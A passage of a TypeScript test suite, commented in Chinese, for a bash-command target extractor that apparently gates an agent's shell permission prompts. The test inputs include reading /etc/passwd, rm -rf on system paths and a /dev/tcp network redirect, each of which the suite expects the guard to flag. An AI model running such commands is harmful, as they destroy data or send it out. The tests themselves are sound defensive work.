  // spec 场景 2: `$(basename $(dirname $f))` 嵌套形式通过递归豁免
  const r = extractBashTargets(
    `for f in openspec/**/*.md; do echo "=== $(basename $(dirname $f)) ==="; head -20 "$f"; echo; done`,
    PROJ,
  );
  assert.equal(r.reliable, true, `expected reliable (nested exemption), got ${JSON.stringify(r)}`);
});

// -------- 1.1 Positive: dirname alone --------

test("substitution_dirname_reliable: dirname_alone_auto_exempt", () => {
  // spec 场景 10: `$(dirname ...)` 单独出现自动放行
  const r = extractBashTargets(
    `head -20 "$(dirname openspec/specs/bash-target-extraction/spec.md)/spec.md"`,
    PROJ,
  );
  assert.equal(r.reliable, true, `expected reliable (dirname exemption), got ${JSON.stringify(r)}`);
});

// -------- 1.1 Positive: pwd --------

test("substitution_pwd_reliable: pwd_auto_exempt", () => {
  // spec 场景 11: `$(pwd)` 自动放行
  const r = extractBashTargets(`echo "cwd: $(pwd)"`, PROJ);
  assert.equal(r.reliable, true, `expected reliable (pwd exemption), got ${JSON.stringify(r)}`);
});

// -------- 1.2 Negative: cat (whitelist miss) --------

test("substitution_cat_still_unreliable: cat_not_in_whitelist_still_prompts", () => {
  // spec 场景 3: 白名单外命令替换仍判不可靠
  const r = extractBashTargets(`echo "$(cat /etc/passwd)"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// -------- 1.2 Negative: realpath (not in whitelist) --------

test("substitution_realpath_still_unreliable: realpath_not_in_whitelist_still_prompts", () => {
  // spec 场景 4: `realpath -m` 允许但 `realpath -f` 不允许 ——
  // 本 change 白名单不含 realpath（无论哪个 flag），豁免失败回退原判定
  const r = extractBashTargets(`echo "$(realpath -m openspec/specs/foo.md)"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// -------- 1.2 Negative: basename with unquoted glob arg --------

test("substitution_glob_arg_still_unreliable: basename_with_unquoted_glob_arg_still_prompts", () => {
  // spec 场景 5: 白名单命令含未加引号 glob 参数仍判不可靠
  // 注意：整条命令同时含 `*.txt`（在 $() 内部），scanUnreliable 会先
  // 触发 glob_expansion，再遇到 $() 的 command_substitution——两者都
  // 是 UNRELIABLE，reason 顺序由扫描位置决定。
  const r = extractBashTargets(`echo "$(basename /etc/*.txt)"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    assert.ok(
      ["command_substitution", "glob_expansion"].includes(r.reason!),
      `expected command_substitution or glob_expansion, got ${r.reason}`,
    );
  }
});

// -------- 1.2 Negative: nesting depth > 3 --------

test("substitution_depth_over_3_still_unreliable: nesting_depth_over_3_still_prompts", () => {
  // spec 场景 6: 嵌套深度超过 3 层判不可靠
  // 这里 4 层嵌套 (basename > dirname > pwd > pwd)，超出 depth 限制
  const r = extractBashTargets(`echo "$(basename $(dirname $(pwd $(pwd))))"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// -------- 1.2 Negative: nested substitution contains write command --------

test("substitution_nested_rm_still_unreliable: nested_rm_still_prompts", () => {
  // spec 场景 7: 白名单命令参数中嵌套替换含写操作仍判不可靠
  // 外层 basename 通过白名单，但嵌套 $(rm -rf /tmp/x) 中 rm 不在白名单
  const r = extractBashTargets(`echo "$(basename $(rm -rf /tmp/x))"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// -------- 1.2 Negative: user variable inside substituted arg --------

test("substitution_with_user_var_still_unreliable: user_var_inside_substitution_still_prompts", () => {
  // spec 场景 8: 白名单命令参数含用户变量仍豁免但走变量判定
  // basename 通过豁免条件 1-4，但 $MY_FILE 触发 findUnresolvedVariable
  const r = extractBashTargets(`echo "path: $(basename $MY_FILE)"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    // findUnresolvedVariable 的 reason 格式为 "unresolved variable: <name>"
    assert.match(
      r.reason ?? "",
      /unresolved variable: MY_FILE/,
      `expected unresolved variable reason, got ${r.reason}`,
    );
  }
});

// -------- 1.2 Negative: redirect inside substitution --------

test("substitution_redirect_still_unreliable: echo_redirect_still_prompts", () => {
  // 安全不变量回归（review finding bash-substitution-readonly-exemption#1）：
  // `$(echo hi > /tmp/x)` 内部有 `>` 重定向，是真实的写操作。
  // 白名单中的 `echo`/`printf` 本身是只读的，但 shell 的重定向语法会
  // 让命令产生写入副作用。豁免判定必须拒绝任何含 `>`/`|`/`&`/`;` 的
  // substitution 内构造，否则 extractor 会静默放行不可见的写入。
  const r = extractBashTargets(`echo "hi: $(echo hi > /tmp/x)"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable (redirect inside substitution), got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

test("substitution_pipeline_still_unreliable: echo_pipeline_still_prompts", () => {
  // 安全不变量回归：`$(echo hi | tee /tmp/x)` 内部有管道 + tee 写操作。
  // 即使 `tee` 本身不在白名单里，管道 `|` 也是被拒绝的副作用构造。
  const r = extractBashTargets(`echo "hi: $(echo hi | tee /tmp/x)"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable (pipeline inside substitution), got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// -------- 1.2 Negative: `test` builtin with query flag --------

test("substitution_test_builtin_reliable: test_with_query_flag_auto_exempt", () => {
  // T1 回归：`test` 是白名单内的合法查询命令，`-n` 是无副作用查询操作符。
  // 与 `test [ -n x ]` 相比：`[` 未在白名单内（I1 修复），单独调用 `test` 是白名单路径。
  const r = extractBashTargets(`echo "$(test -n x)"`, PROJ);
  assert.equal(r.reliable, true, `expected reliable (test -n exemption), got ${JSON.stringify(r)}`);
});

test("substitution_bracket_builtin_unreliable: bracket_not_in_whitelist_still_prompts", () => {
  // I1 修复回归：`[` 已从白名单移除（避免"白名单含 [ 但 `[` 字符本身被 glob 分支拒绝"的死条目）。
  // `[ -n x ]` 是 bash 的 test builtin 别名，但本 change 不覆盖——仍回退原判定。
  const r = extractBashTargets(`echo "$( [ -n x ] )"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable (bracket not in whitelist), got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

test("substitution_arith_unreliable: arith_substitution_still_prompts", () => {
  // T2 回归：`$((x))` 是算术 substitution，非 `$(...)` 命令替换。
  // 顶层命令提取逻辑会把首字符当作命令名（`(x` 之类），必然不在白名单内，
  // 因此豁免失败回退原判定。行为等价于 `$(cat ...)`——白名单外的形式一律拒。
  const r = extractBashTargets(`echo "$((x))"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable (arith substitution), got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

test("substitution_basename_no_args_reliable: basename_no_args_still_exempt", () => {
  // T3 回归：`$(basename)` 无参数——basename 在白名单内，豁免判定只看
  // 顶层命令名是否属于白名单，不检查是否有参数。bash 本身在无参数时会
  // 报错，但 extractor 层不感知运行时行为，按静态只读性判即可。
  const r = extractBashTargets(`echo "$(basename)"`, PROJ);
  assert.equal(r.reliable, true, `expected reliable (basename no-args), got ${JSON.stringify(r)}`);
});

test("substitution_backtick_nested_still_unreliable: backtick_nested_still_prompts", () => {
  // T4 回归：`$(echo \`ls\`)` 内部有反引号——反引号是命令替换的旧形式，
  // 无论外层是否豁免，都拒绝嵌套反引号。
  const r = extractBashTargets(`echo "$(echo \`ls\`)"`, PROJ);
  assert.equal(r.reliable, false, `expected unreliable (nested backtick), got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// -------- 1.3 Interaction: exempt substitution + subsequent write --------

test("substitution_echo_then_rm_writes_target: exempt_substitution_still_extracts_downstream_write", () => {
  // spec 场景 9: 豁免后仍提取后续命令的 write target
  // $(basename $f) 豁免通过；`&&` 后的 rm -rf /tmp/scratch 正常提取 delete target
  const r = extractBashTargets(`echo "$(basename $f)" && rm -rf /tmp/scratch`, PROJ);
  // 注：$f 在顶层 echo 内是用户变量，触发 unresolved variable 判 unreliable。
  // 因此这条命令整体 reliable=false 但 reason 是 unresolved variable。
  // 豁免验证的核心断言：$(basename $f) 内没有触发 command_substitution。
  assert.equal(r.reliable, false, `expected unreliable (unresolved $f), got reliable`);
  if (!r.reliable) {
    assert.notEqual(
      r.reason,
      "command_substitution",
      `exemption should suppress command_substitution, got ${r.reason}`,
    );
  }
  // 用不含用户变量的版本验证 write target 提取
  const r2 = extractBashTargets(`echo "$(basename foo.txt)" && rm -rf /tmp/scratch`, PROJ);
  assert.equal(r2.reliable, true, `expected reliable (basename with literal arg), got ${JSON.stringify(r2)}`);
  if (r2.reliable) {
    assert.ok(
      r2.targets.some((t) => t.path === "/tmp/scratch" && (t.action === "write" || t.action === "delete")),
      `expected delete target /tmp/scratch, got ${JSON.stringify(r2.targets)}`,
    );
  }
});

// -------- 1.4 Regression: existing audit-97 still triggers prompt --------

test("substitution_btp_audit_97_still_triggers_prompt: audit_97_pattern_still_prompts", () => {
  // spec 场景 3 的既有审计回归：audit-97 `$(grep -c 'X' file.md)` 仍判 command_substitution
  // grep 不在 SUBSTITUTION_READONLY_CMDS 白名单内，豁免失败回退原判定
  const cmd = `cd /proj && echo "count: $(grep -c 'X' file.md)"`;
  const r = extractBashTargets(cmd, "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    assert.equal(r.reason, "command_substitution");
  }
});

// ============================================================
// bash-extract-glob-cd-boundary-refine：边界①（空 prefix 只读 glob 豁免）
// ============================================================
//
// 账本场景（proposal scenario→test 覆盖账本）：
//   BMG-RO-empty-prefix-ls-glob-autoallow      只读命令 + 空 prefix glob 自动放行
//   BMG-RO-bare-empty-prefix-ls-autoallow      只读命令 + 裸空 prefix glob 自动放行
//   BMG-RO-empty-prefix-tar-glob-reject        写命令 + 空 prefix glob 仍触发
//   BMG-RO-abs-prefix-glob-reject              只读命令 + 绝对路径前缀 glob 仍触发
//   BMG-RO-tilde-prefix-glob-reject            只读命令 + ~ 前缀 glob 仍触发

test("BMG-RO-empty-prefix-ls-glob-autoallow: ls_md_glob_autoallow", () => {
  // 情形 B：`ls *.md` — ls 只读（条件 3a），空 prefix glob 不以绝对路径标志开头。
  // cwd == projectRoot 假设下展开于 projectRoot 内，bounded 放行。
  const r = extractBashTargets("ls *.md", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.ok(
    r.targets.some((t) => t.action === "read" && t.path === "/proj/*.md"),
    `expected read target /proj/*.md, got ${JSON.stringify(r.targets)}`,
  );
});

test("BMG-RO-bare-empty-prefix-ls-autoallow: ls_bare_glob_autoallow", () => {
  // 情形 B：`ls *` — 裸空 prefix glob。looksLikePath("*")=false，故 readExtract 不提取
  // target（与既有 `ls archive/*/` → [] 惯例一致），但命令整体 reliable 放行。
  const r = extractBashTargets("ls *", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
});

test("BMG-RO-empty-prefix-tar-glob-reject: tar_glob_reject", () => {
  // 情形 B 反例：写命令 `tar` 不满足条件 3 只读判定，空 prefix 放宽不适用。
  const r = extractBashTargets("tar xzf pi-ui-extension-*.tgz", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG-RO-abs-prefix-glob-reject: ls_abs_prefix_glob_reject", () => {
  // 情形 B 反例：`ls /etc/*.conf` — glob 以 `/` 开头（绝对路径前缀），情形 B 不适用。
  const r = extractBashTargets("ls /etc/*.conf", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG-RO-tilde-prefix-glob-reject: ls_tilde_prefix_glob_reject", () => {
  // 情形 B 反例：`ls ~/*.md` — glob 以 `~` 开头（home 展开），情形 B 不适用。
  const r = extractBashTargets("ls ~/*.md", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

// ============================================================
// bash-extract-glob-cd-boundary-refine：边界②（cd 跟踪豁免 + 全绝对下游豁免）
// ============================================================
//
// 账本场景（proposal scenario→test 覆盖账本）：
//   BMG-CD-all-abs-downstream-exempt      cd 后全绝对下游豁免
//   BMG-CD-all-abs-redirect-exempt        cd 后全绝对重定向豁免
//   BMG-CD-rel-redirect-cd-track          cd 后相对重定向 cd 跟踪豁免
//   BMG-CD-rel-downstream-cd-track        cd 后相对路径下游 cd 跟踪豁免
//   BMG-CD-mixed-abs-rel-cd-track         cd 后混合绝对+相对路径 cd 跟踪豁免
//   BMG-CD-glob-rel-prefix-reject         cd 后 glob 相对前缀仍判不可靠（条件5排除）
//   BMG-CD-no-explicit-ref-reject         cd 后无显式路径引用仍判不可靠（防空转）
//   BMG-CD-silent-no-ref-reject           cd 后 SILENT 无显式路径引用仍判不可靠（防空转）
//   BMG-CD-dev-tcp-redirect-reject        cd 后网络套接字重定向仍判不可靠（网络外传防回归）
//   BMG-CD-rel-cd-target-reject           cd 相对目标仍判不可靠（条件2排除）
//   BMG-CD-tilde-cd-target-reject         cd 目标含 ~ 仍判不可靠（条件2排除）
//   BMG-CD-var-cd-target-reject           cd 目标含变量仍判不可靠（条件2排除）
//   BMG-CD-dash-reject                    cd - 仍判不可靠（条件2排除）
//   BMG-CD-pipeline-reject                cd 后管道仍判不可靠（条件3排除）
//   BMG-CD-cwd-anchor-rm-reject           cd 后 cwd 锚点 rm 仍判不可靠（条件4排除）
//   BMG-CD-cwd-anchor-redirect-reject     cd 后 cwd 锚点重定向仍判不可靠（条件4排除）
//   BMG-CD-dev-fd-cd-track-reject         cd 后数字 fd 重定向仍判不可靠（条件6排除）
//   BMG-CD-unextractable-rm-reject        cd 后不可提取相对参数 rm 仍判不可靠（条件7排除）
//   BMG-CD-unextractable-mkdir-reject     cd 后不可提取相对参数 mkdir 仍判不可靠（条件7排除）
//   BMG-CD-pwd-var-reject                 cd 后 $PWD 仍判不可靠（条件8排除）

test("BMG-CD-all-abs-downstream-exempt: cd_all_abs_downstream_exempt", () => {
  // D2b：cd 后下游 `grep` 位置参数 `/tmp/x/file` 显式绝对，豁免适用。
  const r = extractBashTargets("cd /tmp/x && grep -n pattern /tmp/x/file", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.ok(
    r.targets.some((t) => t.action === "read" && t.path === "/tmp/x/file"),
    `expected read target /tmp/x/file, got ${JSON.stringify(r.targets)}`,
  );
});

test("BMG-CD-all-abs-redirect-exempt: cd_all_abs_redirect_exempt", () => {
  // D2b：cd 后重定向目标 `/tmp/x/out` 显式绝对，豁免适用。
  const r = extractBashTargets("cd /tmp/x && echo hi > /tmp/x/out", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.ok(
    r.targets.some((t) => t.action === "write" && t.path === "/tmp/x/out"),
    `expected write target /tmp/x/out, got ${JSON.stringify(r.targets)}`,
  );
});

test("BMG-CD-rel-redirect-cd-track: cd_rel_redirect_cd_track", () => {
  // D2a：纯 && 链 + 绝对 cd 目标 + 相对重定向目标 `rel.txt`。
  // 跟踪 cwd 解析真实落点 `/tmp/x/rel.txt`，而非 `<proj>/rel.txt`。
  const r = extractBashTargets("cd /tmp/x && echo hi > rel.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.ok(
    r.targets.some((t) => t.action === "write" && t.path === "/tmp/x/rel.txt"),
    `expected write target /tmp/x/rel.txt, got ${JSON.stringify(r.targets)}`,
  );
});

test("BMG-CD-rel-downstream-cd-track: cd_rel_downstream_cd_track", () => {
  // D2a：纯 && 链 + 绝对 cd 目标 + 相对路径下游 `file.txt`。
  // 跟踪 cwd 解析真实落点 `/tmp/x/file.txt`。
  const r = extractBashTargets("cd /tmp/x && grep -n pattern file.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.ok(
    r.targets.some((t) => t.action === "read" && t.path === "/tmp/x/file.txt"),
    `expected read target /tmp/x/file.txt, got ${JSON.stringify(r.targets)}`,
  );
});

test("BMG-CD-mixed-abs-rel-cd-track: cd_mixed_abs_rel_cd_track", () => {
  // D2a：混合绝对+相对路径。`/tmp/x/a` 按绝对解析，`b.txt` 按跟踪 cwd 解析。
  const r = extractBashTargets("cd /tmp/x && cat /tmp/x/a && cat b.txt", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  const paths = r.targets.map((t) => t.path);
  assert.ok(paths.includes("/tmp/x/a"), `expected /tmp/x/a, got ${JSON.stringify(paths)}`);
  assert.ok(paths.includes("/tmp/x/b.txt"), `expected /tmp/x/b.txt, got ${JSON.stringify(paths)}`);
});

test("BMG-CD-glob-rel-prefix-reject: cd_glob_rel_prefix_reject", () => {
  // 条件 5 排除：cd 后 `ls *.md` 含未加引号 glob，cd 跟踪豁免不适用。
  const r = extractBashTargets("cd /tmp/x && ls *.md", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-no-explicit-ref-reject: cd_no_explicit_ref_reject", () => {
  // 防空转：`;` 分隔（D2a 条件 1 不满足），且下游 `ls` 无显式路径引用（D2b 条件 1 不满足）。
  const r = extractBashTargets("cd /tmp/x; ls", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-silent-no-ref-reject: cd_silent_no_ref_reject", () => {
  // 防空转：`;` 分隔，下游 `npm test` 无显式路径引用，SILENT_COMMANDS 不构成豁免证据。
  const r = extractBashTargets("cd /proj; npm test", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-dev-tcp-redirect-reject: cd_dev_tcp_redirect_reject", () => {
  // 网络外传防回归：`/dev/tcp/...` 虽以 `/` 开头，但属网络套接字目标，
  // 条件 6 排除 + D2b 不适用，维持 cd_chdir。
  const r = extractBashTargets("cd /etc && echo x > /dev/tcp/1.2.3.4/4444", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-rel-cd-target-reject: cd_rel_cd_target_reject", () => {
  // 条件 2 排除：相对 cd 目标受 CDPATH/当前 cwd 影响，不可静态确定。
  const r = extractBashTargets("cd sub && cat file.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-tilde-cd-target-reject: cd_tilde_cd_target_reject", () => {
  // 条件 2 排除：cd 目标含 ~，依赖 $HOME。
  const r = extractBashTargets("cd ~ && cat file.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-var-cd-target-reject: cd_var_cd_target_reject", () => {
  // 条件 2 排除：cd 目标含 $HOME，不可静态确定。
  const r = extractBashTargets("cd $HOME && cat file.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-dash-reject: cd_dash_reject", () => {
  // 条件 2 排除：`cd -` 栈语义依赖 cwd 历史。
  const r = extractBashTargets("cd /tmp/a && cd - && cat file.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-pipeline-reject: cd_pipeline_reject", () => {
  // 条件 3 排除：含管道 `|`，cd 与管道交互不可静态确定。
  const r = extractBashTargets("cd /tmp/x && cat a.txt | sort", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-cwd-anchor-rm-reject: cd_cwd_anchor_rm_reject", () => {
  // 条件 4 排除：下游 `rm -rf .` 含 cwd 锚点 `.`。
  const r = extractBashTargets("cd /etc && rm -rf .", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-cwd-anchor-redirect-reject: cd_cwd_anchor_redirect_reject", () => {
  // 条件 4 排除：重定向目标 `./out.txt` 含 cwd 锚点 `./`。
  const r = extractBashTargets("cd /tmp/x && echo hi > ./out.txt", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-dev-fd-cd-track-reject: cd_dev_fd_cd_track_reject", () => {
  // 条件 6 排除：重定向目标 `/dev/fd/3` 是数字 fd 目标。
  const r = extractBashTargets("cd /tmp/x && echo x > /dev/fd/3", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-rm-reject: cd_unextractable_rm_reject", () => {
  // 条件 7 排除：写命令 `rm` 位置参数 `sub/` 非显式绝对且 looksLikePath=false。
  const r = extractBashTargets("cd /tmp/x && rm -rf sub/", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-mkdir-reject: cd_unextractable_mkdir_reject", () => {
  // 条件 7 排除：写命令 `mkdir` 位置参数 `sub` 非显式绝对且 looksLikePath=false。
  const r = extractBashTargets("cd /tmp/x && mkdir sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-pwd-var-reject: cd_pwd_var_reject", () => {
  // 条件 8 排除：下游含 $PWD，不随模拟 cwd 漂移。
  const r = extractBashTargets("cd /tmp/x && cat $PWD/foo", "/proj");
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

// ============================================================
// bash-extract-glob-cd-boundary-refine：D2a 安全洞修复（人工 review 6.3 判出）
// ============================================================
//
// 洞：cd 跟踪豁免（D2a）下，cd 后「不可提取的非绝对路径引用」——无扩展名
// 裸词重定向目标（`echo x > sub`）、read-only 命令的无扩展名裸词位置参数
// （`cat sub`、`ls sub`、`grep pattern sub`）——looksLikePath=false 不被提取为
// target，D2a 条件 4-7 全部看不到，从原实现 cd_chdir 弹窗退化为
// reliable:true + 0 target 静默放行。真实落点是 cd 后的 cwd（如 /etc/sub），
// 静默放行写/读系统敏感区。修复：D2a 对「重定向目标 + write/delete 位置
// 参数 + read-only 位置参数」的不可提取非绝对词一律排除（维持 cd_chdir）。
// 这些用例是安全回归锁定，修复后须判 cd_chdir。

test("BMG-CD-unextractable-redirect-reject: cd_echo_gt_sub_reject", () => {
  // 洞 1：cd 后相对重定向目标 `sub`（无扩展名裸词，looksLikePath=false）。
  // 修复后 D2a 排除 → 维持 cd_chdir（不再静默放行写 /etc/sub）。
  const r = extractBashTargets("cd /etc && echo x > sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-redirect-slash-reject: cd_echo_gt_sub_slash_reject", () => {
  // 洞 2：cd 后相对重定向目标 `sub/`（尾部斜杠，looksLikePath=false）。
  const r = extractBashTargets("cd /etc && echo x > sub/", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-read-cat-reject: cd_cat_sub_reject", () => {
  // 洞 3：cd 后 read-only `cat sub`（裸词，looksLikePath=false）。
  const r = extractBashTargets("cd /etc && cat sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-read-ls-reject: cd_ls_sub_reject", () => {
  // 洞 4：cd 后 read-only `ls -la sub`（裸词）。
  const r = extractBashTargets("cd /etc && ls -la sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-read-grep-reject: cd_grep_sub_reject", () => {
  // 洞 5：cd 后 read-only `grep pattern sub`（pattern 是模式词，sub 是裸词）。
  const r = extractBashTargets("cd /tmp/x && grep pattern sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-read-wc-reject: cd_wc_sub_reject", () => {
  // 洞 6：cd 后 read-only `wc sub`（裸词）。
  const r = extractBashTargets("cd /etc && wc sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

// ============================================================
// F1（6.3 收尾 review subagent 判出 critical）：curl/wget 写目标裸词漏检
// ============================================================
//
// 洞：curl/wget 不在 FILE_ARG_COMMANDS，其 `-o`/`-O`/`--output`/
// `--output-document` 写目标值不被 collectStagePathRefs 收集，D2a 条件 9
// 看不到（URL 位置参数亦不收集）。cd 链下 `curl -o sub url` 的 `sub` 是
// cwd-relative 写目标，但 D2a 豁免成立 → reliable:true + 0 target 静默放行
// 写 /etc/sub（与原始洞 echo x > sub 同后果同类别）。修复后须判 cd_chdir。

test("BMG-CD-unextractable-curl-oreject: cd_curl_o_sub_reject", () => {
  // F1 洞 1：curl -o 写目标裸词 `sub`（looksLikePath=false）。
  const r = extractBashTargets("cd /etc && curl -o sub https://x.com/a", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-wget-O-reject: cd_wget_O_sub_reject", () => {
  // F1 洞 2：wget -O 写目标裸词 `sub`。
  const r = extractBashTargets("cd /etc && wget -O sub https://x.com/a", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-curl-O-noarg-reject: cd_curl_O_noarg_reject", () => {
  // F1 洞 3：curl -O 无参——写目标为 URL basename，未知但 cwd-relative。
  // 修复后亦须判 cd_chdir（不可静默放行写 /etc/<urlbasename>）。
  const r = extractBashTargets("cd /etc && curl -O https://x.com/a", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-curl-abs-write-exempt: cd_curl_abs_write_exempt", () => {
  // 对照（防过度修复）：curl -o 绝对写目标仍应豁免（D2b 全绝对下游）。
  const r = extractBashTargets("cd /etc && curl -o /tmp/a.bin https://x.com/a", "/proj");
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.ok(
    r.targets.some((t) => t.action === "write" && t.path === "/tmp/a.bin"),
    `expected write target /tmp/a.bin, got ${JSON.stringify(r.targets)}`,
  );
});

// ============================================================
// F2（6.3 收尾 review subagent 判出 critical，复验后升级）：无 extractor
// 命令（sort/tar/cmp/diff/uniq/sha256sum/gzip/xz）的裸词位置参数漏检
// ============================================================
//
// 洞：这些命令不在 COMMAND_TABLE（无 extractor），其位置参数不被
// collectStagePathRefs 收集（原 FILE_ARG_COMMANDS 只覆盖有 extractor 命令）。
// cd 链下 `cd /etc && sort sub` 的 `sub` 是 cwd-relative 裸词，但 D2a 豁免
// 成立 → reliable:true + 0 target 静默放行读/写 /etc/sub（与 6.3/F1 修的洞
// 同后果同类别）。修复：FILE_ARG_COMMANDS 补齐这些命令 + tar 操作标志跳过
// + D2a 条件 10（无 extractor 命令 + 非绝对位置参数 → d2a 排除）。修复后
// 裸词与相对路径引用一律判 cd_chdir；绝对路径引用仍走 D2b 豁免（防过度
// 修复对照）。这些用例是安全回归锁定，修复后须判 cd_chdir。

test("BMG-CD-unextractable-sort-reject: cd_sort_sub_reject", () => {
  // 洞 1：sort 裸词位置参数（looksLikePath=false）。
  const r = extractBashTargets("cd /etc && sort sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-tar-reject: cd_tar_xf_sub_reject", () => {
  // 洞 2：tar xf 裸词归档（解压写 cwd 下 /etc/sub）。
  const r = extractBashTargets("cd /etc && tar xf sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
  if (!r.reliable) assert.equal(r.reason, "cd_chdir");
});

test("BMG-CD-unextractable-cmp-reject: cd_cmp_sub_reject", () => {
  // 洞 3：cmp 裸词位置参数。
  const r = extractBashTargets("cd /etc && cmp sub", "/proj");
  assert.equal(r.reliable, false, `expected unreliable (cd_chdir), got ${JSON.stringify(r)}`);
